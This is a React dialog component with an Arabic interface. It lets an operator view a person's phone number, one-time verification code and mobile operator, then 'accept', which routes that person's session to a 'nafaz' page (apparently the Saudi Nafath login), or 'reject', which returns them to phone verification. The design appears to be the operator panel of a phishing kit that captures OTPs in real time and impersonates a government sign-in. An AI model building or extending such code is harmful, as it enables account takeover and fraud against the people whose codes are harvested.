"use client";

import { useState } from "react";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogFooter,
} from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Phone, Lock, Shield } from "lucide-react";
import { toast } from "sonner";

interface PhoneDialogProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
  phone2?: string;
  phoneOtp?: string;
  notification: any;
  operator?: string;
  handleApproval: (status: string, id: string) => Promise<void>;
  handleUpdatePageName: (id: string, pagename: string) => Promise<void>;
}

export default function PhoneDialog({
  open,
  onOpenChange,
  phone2,
  phoneOtp,
  operator,
  notification,
  handleUpdatePageName,
  handleApproval,
}: PhoneDialogProps) {
  const [phoneNumber, setPhoneNumber] = useState(notification?.phone2 || notification?.phone || "");
  const [otp, setOtp] = useState(phoneOtp || "");
  const [operatorName, setOperatorName] = useState(operator || "");
  const [requierdAttachment, setRequierdAttachment] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleSave = async () => {
    if (!open) return;

    setIsSubmitting(true);
    try {
      // Since we don't have the notification ID here, we'll just show a success message
      // In a real implementation, you would update the database
      toast.success("تم حفظ بيانات الهاتف بنجاح", {
        position: "top-center",
        duration: 3000,
      });
      onOpenChange(false);
    } catch (error) {
      console.error("Error updating phone information:", error);
      toast.error("حدث خطأ أثناء حفظ البيانات", {
        position: "top-center",
        duration: 3000,
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent
        className="bg-white dark:bg-gray-800 border-0 shadow-2xl max-w-md rounded-xl"
        dir="rtl"
      >
        <DialogHeader className="border-b pb-3">
          <DialogTitle className="text-xl font-bold bg-gradient-to-r from-primary to-primary/80 text-transparent bg-clip-text">
            بيانات الهاتف
          </DialogTitle>
        </DialogHeader>

        <div className="space-y-4 py-3">
          <div className="p-4 rounded-lg bg-gradient-to-r from-purple-500 to-purple-600 text-white shadow-lg">
            <div className="flex justify-between items-start mb-4">
              <div className="flex flex-col">
                <span className="text-sm text-purple-100 mb-1">
                  معلومات الهاتف
                </span>
                <span className="font-medium">
                  {notification?.phone || notification?.phone2 ||"غير محدد"}
                </span>
              </div>
              <Phone className="h-8 w-8 text-white opacity-80" />
            </div>
          </div>

          <div className="space-y-4">
            <div className="grid gap-2">
              <Label htmlFor="phone" className="text-right">
                رقم الهاتف
              </Label>
              <div className="relative">
                <Phone className="absolute right-3 top-2.5 h-4 w-4 text-muted-foreground" />
                <Input
                  id="otp"
                  readOnly
                  value={notification?.phone || notification?.phone2 ||"غير محدد"}
                  className="pr-10"
                  dir="ltr"
                />
              </div>
            </div>

            <div className="grid gap-2">
              <Label htmlFor="otp" className="text-right">
                رمز التحقق
              </Label>
              <div className="relative">
                <Lock className="absolute right-3 top-2.5 h-4 w-4 text-muted-foreground" />
                <Input
                  id="otp"
                  readOnly
                  value={notification?.phoneOtp ||"غير محدد"}
                  className="pr-10"
                  dir="ltr"
                />
              </div>
            </div>

            <div className="grid gap-2">
              <Label htmlFor="operator" className="text-right">
                مشغل الشبكة
              </Label>
              <div className="relative">
                <Shield className="absolute right-3 top-2.5 h-4 w-4 text-muted-foreground" />
                <Input
                  id="otp"
                  readOnly
                  value={notification?.operator}
                  className="pr-10"
                  dir="ltr"
                />
              </div>
            </div>
          </div>
        </div>

        <DialogFooter className="flex flex-col sm:flex-row gap-2 sm:gap-0 mt-4 pt-3 border-t">
          <Button
            onClick={() =>{ 
              handleUpdatePageName(notification.id,'nafaz')
              handleApproval('approved',notification.id)
            }}
            disabled={isSubmitting}
            className="w-full bg-gradient-to-r from-purple-500 to-purple-600 hover:from-purple-600 hover:to-purple-700 text-white border-0 shadow-md"
          >
            {isSubmitting ? "جاري الحفظ..." : "قبول البيانات"}
          </Button>
          <Button
            onClick={() => handleUpdatePageName(notification.id,'verfiy-phone')}
            disabled={isSubmitting}
            className="w-full bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-purple-700 text-white border-0 shadow-md"
          >
            {isSubmitting ? "جاري الحفظ..." : "رفض البيانات"}
          </Button>
        </DialogFooter>
      </DialogContent>
    </Dialog>
  );
}
